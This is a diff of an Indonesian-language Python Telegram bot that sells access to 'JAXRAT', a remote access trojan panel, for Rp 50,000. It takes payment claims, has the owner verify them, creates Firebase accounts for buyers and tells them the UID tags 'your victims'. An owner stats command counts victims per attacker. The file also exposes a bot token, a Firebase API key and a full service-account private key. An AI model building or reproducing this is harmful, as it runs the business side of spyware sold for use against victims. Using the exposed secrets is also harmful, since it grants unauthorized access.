@@ -1,252 +1,256 @@
+import os
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import firebase_admin
 from firebase_admin import credentials, db, auth
 import json
 import requests
-import os
-from flask import Flask, request
-import threading
-import time
 import qrcode
 from io import BytesIO
 
-# ========== KONFIGURASI ==========
-BOT_TOKEN = "8019851816:AAFytb4-6Owqdttdhja77wqabJt8p_ZUaho"
-OWNER_CHAT_ID = "6754308724"  # Chat ID owner @deakfta
-GROUP_LINK = "https://t.me/pangeranjendral"
-PRICE = 50000  # Harga dalam Rupiah
+# ===== KONFIGURASI =====
+BOT_TOKEN = "8019851816:AAFytb4-6Owqdttdhja77wqabJt8p_ZUaho"  # GANTI
+OWNER_CHAT_ID = 6754308724  # GANTI DENGAN CHAT_ID LO
+FIREBASE_URL = "https://jaxrat-6813c-default-rtdb.firebaseio.com"
+FIREBASE_API_KEY = "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ"
 
-# Firebase Admin SDK (Service Account)
-# Lo harus download service account dari Firebase Console
-# Project Settings -> Service Accounts -> Generate New Private Key
-# Isi creds di bawah pake isi file JSON nya
-FIREBASE_CRED = {
-  "type": "service_account",
-  "project_id": "jaxrat-6813c",
-  "private_key_id": "02bc4a6e3d0063caf5b42254cafd24285defba32",
-  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCuB5XdjIezC76R\n4iDKPxLPYjTbF6X1gxxGCvU1pJF9WqL166W9bdJiTVe6wmWcl9AYwQQwq43QRmuD\nOokmKL/MmvGEFTheClSO8V0r25/arRgbmFV2XcQB5zPUMNhO1EkzbW96maXgwKur\ns1sUaJ67ynzeLaIuOQWwSXtyYbUbFiEkOBtKXm129iUUK3cdgFdNMOoD4VBTPyvt\nxJrIm3C6BpoD95kibd05/wE9iXoCqTOV0YgzyGVN+pm2XmRliIhvPSue1TmMz9Jn\nKnDBwZaop3KD5ldgnhU6FAWbs8IdrWNlIxsJOU6JicwoJp6TEgPGE0HlKm+J2cbr\n00khlhwBAgMBAAECggEAUrBo/YVt3t2INaHXybExe1di3O0+HksnToKbY1soBANi\nZe4LaNf7PFkag7Mle8PIjVJ87rE850bmg8p26yo2g/3lHsjEaS6IYgj+J74plMpl\nJ4t4pA7GeM8F2d9BkCcfBvALJZpG7mUtzJ4iey6AqaL7NMhDBKp0cQBhRwZ0+oJ+\n43h+Ei0c0PPqmRmlUmU/lnosH52YZJvYGe4fJmEgA1XT397O1WIlcyS5g/MD1kiN\neKjGiaGRGWXq1kY6L0eJhiXMSQvKDV0D+xbuIyml1SaiWeYMNHZVX/PNxyguDEXW\nksSzSg58l2hC78cqvB/F/VVBUiZNTe2WQ1Uf4WLSbwKBgQDfR2Rj3rIpnSoSMDV+\n10TMTWOrygnv4W91en5GFTN1FSYCA5oDtsUQX+OSnU/8JicU9/lYOrakZr+bHtrG\nnU9rSzbDvs1U0OUto2PvkYNRUH0ja9Rbnr+6HIirRIUoVw+XqQ4sUeu0nTC2EQmE\newaDVsvxFewVMcdCH6OBQTMXtwKBgQDHiIqeVjO7XTFOwIaoPN9QpfjZ1PzPscxR\n3P3i2e+iuJ8ceFJhe3wvkoM1ocL8lz8mDxu1o9trKGP4ce1HKSfpsRZ0Lu+g0Yuv\n+0XAqqtIRMWkVojmfUNwffBkXdEYvx2X+EhMGNgGw0oAfTXVvMlwu0fFSmHA0mca\nj739vrc6BwKBgCG/tsrptGBZ4ywQoWVkwH9pCzHCPjJGDwTg2Qla1wZRhgcz6Cm7\njJnnBIz6vkZMtgeTW9scNNMwvLGDvmnbCVAcdFCuHHc/hASb99UUV5cI5YFfISAg\nJLbK7VWF6+KnFjJEWWIVl90bDWvXs2qU9e0QR49PUvn5Jjc2dQ5qfoCNAoGBAIm3\nSv1nv8LU2oBhT0903Cj8tNocL/Vl4QCrh6v4AXaM+Hyc6zcPFLJ87ASrRjoyZcpt\n6REgLAQ013MVptBTrpGTwUylTIzxs/jdc9I7uYZiuQrpEwoKcO6GbdHIEtaCqflG\nyxeCmi9owH2/7dU8vMgK6slXwkpkrfbeOSKWbD4nAoGAJ62U0iyJK/Y5FzVfy7nP\nk7IxJqhqejDTmK3TSPCUwHegCwuiSfnppH6kiV6Ddn5liv1KyVheonQBJRw44i1c\n1GVqHGRE9CJ5krv+3GP3s3K2d+lqdnjsQnu/CMsP+0eps6ZoWeEobxPW8taOoPZn\n2nfDbGlV+P39ffxy+KYsoLA=\n-----END PRIVATE KEY-----\n",
-  "client_email": "firebase-adminsdk-fbsvc@jaxrat-6813c.iam.gserviceaccount.com",
-  "client_id": "112368574790669293839",
-  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-  "token_uri": "https://oauth2.googleapis.com/token",
-  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40jaxrat-6813c.iam.gserviceaccount.com",
-  "universe_domain": "googleapis.com"
-}
-
-# Inisialisasi Firebase Admin
-cred = credentials.Certificate(FIREBASE_CRED)
+# Inisialisasi Firebase
+cred = credentials.Certificate({
+    "type": "service_account",
+    "project_id": "jaxrat-6813c",
+    "private_key_id": os.environ.get("FIREBASE_PRIVATE_KEY_ID"),
+    "private_key": os.environ.get("FIREBASE_PRIVATE_KEY").replace('\\n', '\n'),
+    "client_email": os.environ.get("FIREBASE_CLIENT_EMAIL"),
+    "client_id": os.environ.get("FIREBASE_CLIENT_ID"),
+    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+    "token_uri": "https://oauth2.googleapis.com/token"
+})
 firebase_admin.initialize_app(cred, {
-    'databaseURL': 'https://jaxrat-6813c-default-rtdb.firebaseio.com'
+    'databaseURL': FIREBASE_URL
 })
 
-# Referensi database
-ref_settings = db.reference('settings')
-ref_users = db.reference('users')
-ref_premium = db.reference('premium_users')
-
-# Set owner UID di Firebase
-owner_uid = "OWNER_FIREBASE_UID"  # Ganti dengan UID Firebase lo nanti
-ref_settings.child('owner_uid').set(owner_uid)
-ref_settings.child('users_db').set({})
-
-# Inisialisasi Bot
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ========== FLASK UNTUK WEBHOOK ==========
-server = Flask(__name__)
+# ===== FUNGSI FIREBASE AUTH =====
+def create_firebase_user(email, password):
+    """Buat user baru di Firebase Auth via REST API"""
+    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={FIREBASE_API_KEY}"
+    payload = {
+        "email": email,
+        "password": password,
+        "returnSecureToken": True
+    }
+    res = requests.post(url, json=payload)
+    if res.status_code == 200:
+        return res.json()
+    return None
 
-# Simpan status pembayaran sementara
-pending_payments = {}
-
-# ========== FUNGSI QRIS ==========
-def generate_qris(amount):
-    # Ini simulasi, nanti lo ganti pake payment gateway beneran
-    # Atau lo bisa generate QRIS statis lalu manual
-    qr = qrcode.QRCode(version=1, box_size=10, border=5)
-    qr.add_data(f"Payment {amount} to @deakfta")
-    qr.make(fit=True)
-    img = qr.make_image(fill_color="black", back_color="white")
-    bio = BytesIO()
-    bio.name = 'qris.png'
-    img.save(bio, 'PNG')
-    bio.seek(0)
-    return bio
-
-# ========== COMMANDS ==========
+# ===== HANDLER BOT =====
 @bot.message_handler(commands=['start'])
 def start(message):
-    chat_id = str(message.chat.id)
-    
-    # Cek apakah user udah premium
-    premium_check = ref_premium.get()
-    if premium_check and chat_id in premium_check:
-        bot.reply_to(message, "✅ Kamu sudah premium! Akses panel: https://panel-lo.vercel.app")
-        return
-    
     markup = InlineKeyboardMarkup()
     markup.row(
-        InlineKeyboardButton("💳 Beli Akses 50rb", callback_data="buy"),
-        InlineKeyboardButton("👥 Join Grup", url=GROUP_LINK)
+        InlineKeyboardButton("💳 Beli Panel", callback_data="buy"),
+        InlineKeyboardButton("📞 Kontak Owner", url="https://t.me/pangeranjendral")
     )
-    
-    bot.send_message(
-        chat_id,
-        "🔐 *Selamat datang di RAT Premium*\n\n"
-        "Harga: Rp 50.000 (sekali bayar, akses seumur hidup)\n"
-        "Fitur:\n"
-        "• Panel monitoring real-time\n"
-        "• Akses ke semua fitur RAT\n"
-        "• Update gratis\n\n"
-        "Klik tombol di bawah untuk memulai!",
-        parse_mode="Markdown",
-        reply_markup=markup
+    bot.reply_to(message, 
+        "👋 *Selamat datang di JAXRAT BOT*\n\n"
+        "Bot ini digunakan untuk aktivasi panel monitoring.\n"
+        "Harga: *Rp 50.000* (sekali bayir, akses permanen)\n\n"
+        "Klik tombol di bawah untuk mulai.", 
+        parse_mode="Markdown", reply_markup=markup
     )
 
 @bot.callback_query_handler(func=lambda call: call.data == "buy")
 def buy_callback(call):
-    chat_id = str(call.message.chat.id)
+    chat_id = call.message.chat.id
     
-    # Generate QRIS
-    qris_img = generate_qris(PRICE)
+    # Generate QR Code pembayaran
+    # GANTI DENGAN QR LO (QRIS/OVO/DANA)
+    qr = qrcode.QRCode(box_size=10, border=4)
+    qr.add_data("https://t.me/deakfta")  # Ganti dengan link pembayaran lo
+    qr.make()
     
-    # Simpan pending payment
-    pending_payments[chat_id] = {
-        'status': 'waiting',
-        'timestamp': time.time()
-    }
+    img = qr.make_image()
+    bio = BytesIO()
+    bio.name = 'qr.jpeg'
+    img.save(bio, 'JPEG')
+    bio.seek(0)
     
     markup = InlineKeyboardMarkup()
-    markup.row(
-        InlineKeyboardButton("✅ Sudah Bayar", callback_data="confirm_payment"),
-        InlineKeyboardButton("❌ Batal", callback_data="cancel")
-    )
+    markup.add(InlineKeyboardButton("✅ Udah Bayar", callback_data="paid"))
     
     bot.send_photo(
-        chat_id,
-        qris_img,
-        caption=f"💳 *Scan QRIS di atas*\n\n"
-                f"Total: Rp {PRICE:,}\n"
-                f"Batas waktu: 30 menit\n\n"
-                f"Setelah bayar, klik 'Sudah Bayar' dan kirim bukti transfer.",
-        parse_mode="Markdown",
+        chat_id, 
+        photo=bio, 
+        caption="Scan QR ini buat bayar 50rb.\n\n"
+                "Transfer ke: (DANA/OVO/BCA) - 081234567890 a.n JAXRAT\n\n"
+                "Klik 'Udah Bayar' setelah transfer.",
         reply_markup=markup
     )
 
-@bot.callback_query_handler(func=lambda call: call.data == "confirm_payment")
-def confirm_payment(call):
-    chat_id = str(call.message.chat.id)
+@bot.callback_query_handler(func=lambda call: call.data == "paid")
+def paid_callback(call):
+    chat_id = call.message.chat.id
     
-    if chat_id not in pending_payments:
-        bot.answer_callback_query(call.id, "Session expired. Mulai lagi dengan /start")
-        return
+    # Forward ke owner buat verifikasi manual
+    bot.forward_message(OWNER_CHAT_ID, chat_id, call.message.message_id)
+    bot.send_message(OWNER_CHAT_ID, f"User {chat_id} @{call.from_user.username} claim udah bayar. Verifikasi?")
     
-    bot.send_message(
-        chat_id,
-        "📤 *Kirim Bukti Transfer*\n\n"
-        "Kirim screenshot bukti transfer ke @deakfta (OWNER)\n"
-        "Setelah itu owner akan mengaktifkan akunmu.",
-        parse_mode="Markdown"
-    )
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("✅ Verifikasi", callback_data=f"verify_{chat_id}"))
+    bot.send_message(OWNER_CHAT_ID, "Klik tombol ini kalo udah dicek", reply_markup=markup)
     
-    # Notifikasi owner
-    bot.send_message(
-        OWNER_CHAT_ID,
-        f"🧾 *Konfirmasi Pembayaran*\n"
-        f"Dari: {chat_id}\n"
-        f"Username: @{call.from_user.username}\n"
-        f"Nama: {call.from_user.first_name}\n\n"
-        f"Chat user untuk minta bukti transfer!",
-        parse_mode="Markdown"
-    )
+    bot.send_message(chat_id, "Mohon tunggu, owner bakal verifikasi pembayaran lo dalam 1x24 jam.")
 
-@bot.message_handler(commands=['adduser'])
-def adduser(message):
-    if str(message.chat.id) != OWNER_CHAT_ID:
-        bot.reply_to(message, "❌ Lo bukan owner!")
-        return
+@bot.callback_query_handler(func=lambda call: call.data.startswith("verify_"))
+def verify_callback(call):
+    user_chat_id = int(call.data.split("_")[1])
     
-    # Format: /adduser <chat_id> <email> <password>
+    # Minta email & password
+    msg = bot.send_message(user_chat_id, 
+        "✅ Pembayaran diverifikasi!\n\n"
+        "Sekarang buat akun Firebase lo:\n"
+        "Kirim *email* dan *password* dalam format:\n`email|password`\n\n"
+        "Contoh: `user@gmail.com|rahasia123`",
+        parse_mode="Markdown"
+    )
+    bot.register_next_step_handler(msg, process_register)
+
+def process_register(message):
     try:
-        _, target_chat_id, email, password = message.text.split()
-    except:
-        bot.reply_to(message, "Format: /adduser <chat_id> <email> <password>")
-        return
-    
-    # Buat user di Firebase Auth
-    try:
-        user = auth.create_user(
-            email=email,
-            password=password,
-            email_verified=True
-        )
+        email, password = message.text.split('|')
+        email = email.strip()
+        password = password.strip()
         
-        # Simpan ke database
-        user_data = {
+        # Buat user di Firebase
+        user = create_firebase_user(email, password)
+        if not user:
+            bot.reply_to(message, "Gagal bikin user. Coba lagi nanti.")
+            return
+        
+        uid = user['localId']
+        
+        # Simpan ke Realtime Database
+        ref = db.reference(f'users/{uid}')
+        ref.set({
             'email': email,
-            'password': password,  # JANGAN simpan password di production, ini cuma contoh
-            'chat_id': target_chat_id,
-            'created_at': time.time(),
+            'chat_id': message.chat.id,
+            'username': message.from_user.username,
+            'created_at': {'.sv': 'timestamp'},
             'active': True
-        }
+        })
         
-        ref_users.child(user.uid).set(user_data)
-        ref_premium.child(target_chat_id).set(user.uid)
+        # Simpan juga di settings/users_db buat tracking owner
+        db.reference('settings/users_db').push({
+            'uid': uid,
+            'email': email,
+            'chat_id': message.chat.id
+        })
         
-        # Kirim notifikasi ke user
-        bot.send_message(
-            target_chat_id,
-            "✅ *Akses Diaktifkan!*\n\n"
-            f"Email: `{email}`\n"
-            f"Password: `{password}`\n\n"
-            f"🔗 Login Panel: https://panel-lo.vercel.app\n"
-            f"UID Firebase lo: `{user.uid}`\n\n"
-            f"Simpan UID ini untuk dihubungkan ke aplikasi victim!",
+        # Kasih link grup
+        bot.reply_to(message,
+            f"✅ *Akun berhasil dibuat!*\n\n"
+            f"📧 Email: `{email}`\n"
+            f"🔑 Password: `{password}`\n"
+            f"🆔 UID: `{uid}`\n\n"
+            f"🔗 *Link Panel:* https://jaxrat-panel.vercel.app\n"
+            f"👥 *Link Grup:* https://t.me/pangeranjendral\n\n"
+            f"Simpan UID ini baik-baik, itu buat nandain korban lo.",
             parse_mode="Markdown"
         )
         
-        bot.reply_to(message, f"✅ User diaktifkan! UID: {user.uid}")
+        # Notif owner
+        bot.send_message(OWNER_CHAT_ID, 
+            f"User baru: @{message.from_user.username}\n"
+            f"UID: {uid}\nEmail: {email}"
+        )
         
     except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
+        bot.reply_to(message, f"Format salah. Kirim email|password. Error: {e}")
 
-# ========== RUN BOT ==========
-@server.route('/bot', methods=['POST'])
-def get_message():
-    json_str = request.get_data().decode('UTF-8')
-    update = telebot.types.Update.de_json(json_str)
-    bot.process_new_updates([update])
-    return '!', 200
+# ===== ADMIN COMMANDS =====
+@bot.message_handler(commands=['adduser'])
+def admin_adduser(message):
+    if message.chat.id != OWNER_CHAT_ID:
+        return
+    
+    try:
+        # Format: /adduser email|password|chat_id
+        _, data = message.text.split(' ', 1)
+        email, password, chat_id = data.split('|')
+        
+        user = create_firebase_user(email, password)
+        if user:
+            uid = user['localId']
+            db.reference(f'users/{uid}').set({
+                'email': email,
+                'chat_id': int(chat_id),
+                'created_by': 'owner',
+                'created_at': {'.sv': 'timestamp'},
+                'active': True
+            })
+            
+            bot.reply_to(message, f"✅ User created!\nUID: {uid}\nEmail: {email}")
+            
+            # Notify user
+            bot.send_message(int(chat_id), 
+                f"🎉 Akun lo udah diaktifin owner!\n"
+                f"Email: {email}\nPass: {password}\n"
+                f"Panel: https://jaxrat-panel.vercel.app"
+            )
+        else:
+            bot.reply_to(message, "❌ Gagal bikin user.")
+    except Exception as e:
+        bot.reply_to(message, f"Error: {e}\nFormat: /adduser email|password|chat_id")
 
-@server.route('/')
-def webhook():
-    bot.remove_webhook()
-    bot.set_webhook(url='https://namaproject-lo.replit.app/bot')
-    return "Bot running!", 200
+@bot.message_handler(commands=['broadcast'])
+def broadcast(message):
+    if message.chat.id != OWNER_CHAT_ID:
+        return
+    
+    msg_text = message.text.replace('/broadcast', '').strip()
+    if not msg_text:
+        bot.reply_to(message, "Masukin pesan.")
+        return
+    
+    # Ambil semua user dari Realtime DB
+    users = db.reference('users').get()
+    if users:
+        sent = 0
+        for uid, user_data in users.items():
+            if user_data.get('chat_id'):
+                try:
+                    bot.send_message(user_data['chat_id'], f"📢 Broadcast: {msg_text}")
+                    sent += 1
+                except:
+                    pass
+        bot.reply_to(message, f"Broadcast terkirim ke {sent} user.")
+    else:
+        bot.reply_to(message, "Nggak ada user.")
 
-def run_flask():
-    server.run(host='0.0.0.0', port=8080)
+@bot.message_handler(commands=['stats'])
+def stats(message):
+    if message.chat.id != OWNER_CHAT_ID:
+        return
+    
+    users = db.reference('users').get()
+    victims = db.reference('victims').get()
+    
+    total_users = len(users) if users else 0
+    total_victims = 0
+    if victims:
+        for attacker in victims:
+            total_victims += len(victims[attacker]) if victims[attacker] else 0
+    
+    bot.reply_to(message,
+        f"📊 *STATISTIK JAXRAT*\n\n"
+        f"👤 Total User Panel: {total_users}\n"
+        f"📱 Total Korban: {total_victims}\n"
+        f"💬 Bot Aktif: ✅",
+        parse_mode="Markdown"
+    )
 
 if __name__ == "__main__":
-    # Hapus webhook lama kalau ada
-    bot.remove_webhook()
-    time.sleep(1)
-    # Set webhook ke URL Replit
-    bot.set_webhook(url='https://namaproject-lo.replit.app/bot')
-    
-    # Jalankan Flask di thread terpisah
-    threading.Thread(target=run_flask, daemon=True).start()
-    
-    # Keep main thread alive
-    while True:
-        time.sleep(60)
-        # Cek pending payments expired (lebih dari 30 menit)
-        current_time = time.time()
-        expired = []
-        for chat_id, data in pending_payments.items():
-            if current_time - data['timestamp'] > 1800:  # 30 menit
-                expired.append(chat_id)
-        
-        for chat_id in expired:
-            del pending_payments[chat_id]
+    print("Bot JAXRAT berjalan...")
+    bot.infinity_polling()
